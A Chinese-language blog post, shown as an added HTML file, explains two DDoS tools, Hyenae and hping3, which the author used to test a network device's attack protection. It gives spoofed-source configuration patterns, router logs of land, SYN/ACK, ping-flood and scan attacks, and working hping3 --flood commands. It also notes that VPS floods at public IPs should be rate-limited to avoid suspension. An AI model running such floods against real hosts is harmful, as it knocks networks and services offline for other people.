@@ -1,0 +1,196 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="simple life"><title>两款实用的DDos攻击工具 | LITREILY</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script></head><link rel="stylesheet" type="text/css" href="/plugins/prettify/doxy.css"><script type="text/javascript" src="/js/ready.js" async></script><body><div class="box" id="container"><div class="h-wrapper"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">LITREILY</a></h1></div><p class="m-desc">心之所向，无惧无悔,<br>愿求仁得仁，复无怨怼！</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="https://litreily.gitbooks.io/notes/">笔记</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li class="m-sch"><form class="form" id="j-formsch" action="/search" method="get"><input class="txt" type="text" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"></form></li></ul></div></nav></div><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><h1 class="p-title">两款实用的DDos攻击工具</h1><div class="p-content"><p>之前为了重现某个bug，需要对网络设备进行ddos攻击测试，同时也是对设备的网络攻击防护功能进行抗压测试。临阵磨枪，google了两款攻击工具，windows平台的<code>hyenae</code>，以及Linux平台的<code>hping3</code>，在此记录一下两者的用法。</p>
+<h2 id="Hyenae"><a href="#Hyenae" class="headerlink" title="Hyenae"></a>Hyenae</h2><p><code>hyenae</code>是在<code>Windows</code>平台上非常好用的一款<code>ddos</code>攻击工具，可以完成绝大多数的攻击操作。</p>
+<h3 id="download"><a href="#download" class="headerlink" title="download"></a>download</h3><ul>
+<li><a href="https://sourceforge.net/projects/hyenae/" target="_blank" rel="noopener">https://sourceforge.net/projects/hyenae/</a></li>
+</ul>
+<h3 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h3><ul>
+<li>ARP-Request flooding</li>
+<li>ARP-Cache poisoning</li>
+<li>PPPoE session initiation flooding</li>
+<li>Blind PPPoE session termination</li>
+<li>ICMP-Echo flooding</li>
+<li>ICMP-Smurf attack</li>
+<li>ICMP based TCP-Connection reset</li>
+<li>TCP-SYN flooding</li>
+<li>TCP-Land attack</li>
+<li>Blind TCP-Connection reset</li>
+<li>UDP flooding</li>
+<li>DNS-Query flooding</li>
+<li>DHCP-Discover flooding</li>
+<li>DHCP starvation attack</li>
+<li>DHCP-Release forcing</li>
+<li>Cisco HSRP active router hijacking</li>
+<li>Pattern based packet address configuration</li>
+<li>Intelligent address and address protocol detection</li>
+<li>Smart wildcard-based randomization</li>
+<li>Daemon for setting up remote attack networks - HyenaeFE QT-Frontend support</li>
+</ul>
+<h3 id="interface"><a href="#interface" class="headerlink" title="interface"></a>interface</h3><p><img src="/assets/network/hyenae-interface.png" alt="hyenae interface"></p>
+<p><code>hyenae</code>的界面比较简单，图中展示的是<code>SYN/ACK</code>洪泛攻击的配置选项。</p>
+<ul>
+<li><code>operation mode</code>中可以选择网卡</li>
+</ul>
+<ul>
+<li><code>Network Protocol</code>中可以选择攻击方式对应的网络协议，如<code>SYN</code>洪泛攻击对应传输层的<code>TCP</code>，<code>IP</code>协议可选<code>IPv4, IPv6</code></li>
+</ul>
+<ul>
+<li>攻击源的<code>IP</code>,<code>MAC</code>地址以及端口号可以非常灵活的设置，按<code>MAC-IP@port</code>的格式书写，如图中的攻击源匹配模式<code>%-172.17.14.158@80</code><ul>
+<li>% 代表任意，在此处代表任意的MAC地址</li>
+<li>172.17.14.158为伪造的攻击源IP，可以修改为任意的合法IP</li>
+<li>80为端口号，80同时也是网络服务器的默认端口</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>攻击目标的设置方式与攻击源一致，图中的<code>%-172.17.14.10@80</code><ul>
+<li>% 随机生成MAC地址</li>
+<li>172.17.14.10代表被攻击的IP</li>
+<li>80为攻击目标的被攻击端口号</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>针对<code>TCP</code>协议，右侧给出其对应的<code>5</code>个常见<code>flags</code>: <code>FIN, SYN, RST, PSH, ACK</code><ul>
+<li>可以随意进行单选或多选，以实现不同的攻击方式</li>
+<li>随意的组合可以产生正常通信过程中无法出现的数据包</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>软件下方可以设置数据包的发送速率，默认为无限速发送，这会暂用大量带宽，导致网络拥塞；当然啦，这个软件本就是为了攻击网络，导致网络瘫痪正是其目的所在</li>
+</ul>
+<ul>
+<li>选择不同的攻击方式，会显示相应不同的配置选项 </li>
+</ul>
+<p>简单说，这幅图的作用是产生<code>MAC</code>地址随机，<code>IP</code>为<code>172.17.14.158</code>，端口为80的伪造源，去攻击目的<code>MAC</code>随机，<code>IP</code>为<code>172.17.14.10</code>的<code>web server</code>。</p>
+<p>由于目的<code>MAC</code>随机，<strong>当MAC地址首字节为奇数时，生成的数据包为广播包</strong>，此时将产生广播风暴，局域网内的所有设备都将收到大量的广播包，当速率很高时，很容易导致局域网瘫痪，这是需要注意的。本人当时年少轻狂，有次测试，使用全速率的广播式<code>SYN/ACK</code>攻击，直接导致部门的局域网瘫痪断网，幸好是晚上，后来找人重置了部门内的网络设备才恢复，想想真是罪过啊。</p>
+<h3 id="Use-cases"><a href="#Use-cases" class="headerlink" title="Use cases"></a>Use cases</h3><ul>
+<li>Land Attack<ul>
+<li>src:  %-172.17.14.94@53</li>
+<li>des: %-172.17.14.94@80</li>
+</ul>
+</li>
+</ul>
+<pre><code class="bash">DoS *** 3118 *** {Land Attack} are suppressed!
+[DoS Attack: Land Attack] from source: 172.17.14.94, port 53,
+[DoS Attack: Land Attack] from source: 172.17.14.94, port 53,
+[DoS Attack: Land Attack] from source: 172.17.14.94, port 53,
+</code></pre>
+<ul>
+<li>SYN/ACK scan (TCP SYN ACK)<ul>
+<li>src: %-172.17.14.8@80</li>
+<li>des: %-172.17.14.94@80</li>
+</ul>
+</li>
+</ul>
+<pre><code class="bash">DoS *** 3896 *** {SYN/ACK Scan} are suppressed!
+[DoS Attack: SYN/ACK Scan] from source: 172.17.14.8, port 80,
+[DoS Attack: SYN/ACK Scan] from source: 172.17.14.8, port 80,
+[DoS Attack: SYN/ACK Scan] from source: 172.17.14.8, port 80,
+</code></pre>
+<ul>
+<li>ping flood (icmp echo)<ul>
+<li>src:  %-172.17.14.8</li>
+<li>des: %-172.17.14.94</li>
+</ul>
+</li>
+</ul>
+<pre><code class="bash">DoS *** 1881 *** {Ping Flood} are suppressed!
+[DoS Attack: Ping Flood] from source: 172.17.14.8,
+[DoS Attack: Ping Flood] from source: 172.17.14.8,
+[DoS Attack: Ping Flood] from source: 172.17.14.8,
+</code></pre>
+<ul>
+<li>ping sweep (icmp echo)<ul>
+<li>src:  %-%</li>
+<li>des: %-%</li>
+</ul>
+</li>
+</ul>
+<pre><code class="bash">DoS *** 1719 *** {Ping Sweep} are suppressed!
+[DoS Attack: Ping Sweep] from source: 188.167.1.1,
+[DoS Attack: Ping Sweep] from source: 113.172.1.5,
+[DoS Attack: Ping Sweep] from source: 175.181.2.6,
+</code></pre>
+<ul>
+<li>RST Scan(TCP RST)<ul>
+<li>src: %-172.17.14.8@80</li>
+<li>des: %-172.17.14.94@80</li>
+</ul>
+</li>
+</ul>
+<pre><code class="bash">DoS *** 4023 *** {RST Scan} are suppressed!
+[DoS Attack: RST Scan] from source: 172.17.14.8, port 80,
+[DoS Attack: RST Scan] from source: 172.17.14.8, port 80,
+[DoS Attack: RST Scan] from source: 172.17.14.8, port 80,
+</code></pre>
+<ul>
+<li>ACK scan (TCP ACK)<ul>
+<li>src: %-172.17.14.8@80</li>
+<li>des: %-172.17.14.94@80</li>
+</ul>
+</li>
+</ul>
+<pre><code class="bash">DoS *** 3989 *** {ACK Scan} are suppressed!
+[DoS Attack: ACK Scan] from source: 172.17.14.8, port 80,
+[DoS Attack: ACK Scan] from source: 172.17.14.8, port 80,
+[DoS Attack: ACK Scan] from source: 172.17.14.8, port 80
+</code></pre>
+<ul>
+<li>FIN scan(TCP FIN)<ul>
+<li>src: %-172.17.14.8@80</li>
+<li>des: %-172.17.14.94@80</li>
+</ul>
+</li>
+</ul>
+<pre><code class="bash">DoS *** 3009 *** {FIN Scan} are suppressed!
+[DoS Attack: FIN Scan] from source: 172.17.14.8, port 80,
+[DoS Attack: FIN Scan] from source: 172.17.14.8, port 80,
+[DoS Attack: FIN Scan] from source: 172.17.14.8, port 80,
+</code></pre>
+<h2 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h2><blockquote>
+<p>hping3是用于生成和解析TCPIP协议数据包的开源工具</p>
+</blockquote>
+<p><code>hping3</code>同样可用于产生<code>ddos</code>攻击包，但与<code>hyenae</code>不同的是，<code>hping3</code>无法手动设置<code>MAC</code>地址，而是根据<code>IP</code>地址自动获取</p>
+<p>需要注意的是，如果使用搬瓦工购买的<code>vps</code>向公网IP执行<code>hping3</code>攻击的话，最好不要尝试，如果要用也一定记得限速，否则就会被警告并关停,当然你有3次机会重置</p>
+<p><img src="/assets/network/vps-warning.png" alt="vps warning"></p>
+<h3 id="examples"><a href="#examples" class="headerlink" title="examples"></a>examples</h3><pre><code class="bash"># land attack
+$ sudo hping3 -V -c 10000 -d 120 -S -w 64 --keep -p 80 -s 20000 --flood -a 172.17.14.52 172.17.14.52
+# syn/ack attack
+$ sudo hping3 -V -c 10000 -d 120 -S -A -w 64 --keep -p 80 -s 80 --flood -a 172.17.14.192 172.17.14.52
+
+# -V verbose
+# -c packet count
+# -d data size
+# -p destPort
+# -s srcPort
+# -a srcIP
+# -S SYN tag
+# -A ACK tag
+# -w winsize
+# -I interface
+</code></pre>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul>
+<li>网络攻击工具<ul>
+<li>hping3<ul>
+<li><a href="http://man.linuxde.net/hping3" target="_blank" rel="noopener">http://man.linuxde.net/hping3</a></li>
+<li><a href="http://0daysecurity.com/articles/hping3_examples.html" target="_blank" rel="noopener">http://0daysecurity.com/articles/hping3_examples.html</a></li>
+</ul>
+</li>
+<li>LOIC</li>
+<li>hyenae <ul>
+<li><a href="https://sourceforge.net/projects/hyenae/" target="_blank" rel="noopener">https://sourceforge.net/projects/hyenae/</a></li>
+</ul>
+</li>
+<li>免费DDOS攻击测试工具大合集 <a href="http://www.freebuf.com/sectool/36545.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/36545.html</a></li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>ddos攻击说明<ul>
+<li><a href="https://security.radware.com/ddos-knowledge-center/ddospedia/syn-flood/" target="_blank" rel="noopener">https://security.radware.com/ddos-knowledge-center/ddospedia/syn-flood/</a></li>
+<li>网络攻击：半连接攻击(SYN攻击)、全连接攻击、RST攻击、IP欺骗、DNS欺骗、DOS/DDOS攻击  <a href="http://blog.csdn.net/guowenyan001/article/details/11777361" target="_blank" rel="noopener">http://blog.csdn.net/guowenyan001/article/details/11777361</a></li>
+</ul>
+</li>
+</ul>
+</div></article></div><div class="l-pager l-pager-dtl box"><a class="prev" href="/2018/03/17/lofter/">&lt; Python网络爬虫1 - 爬取网易LOFTER图片</a><a class="next" href="/2018/02/08/mysql-basic/">mySQL基本语法 &gt;</a></div><footer><p>Copyright © 2018 <a href="/." rel="nofollow">LITREILY | </a>Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer><script type="text/javascript" src="/plugins/prettify/prettify.js"></script></div></div></div></body></html>
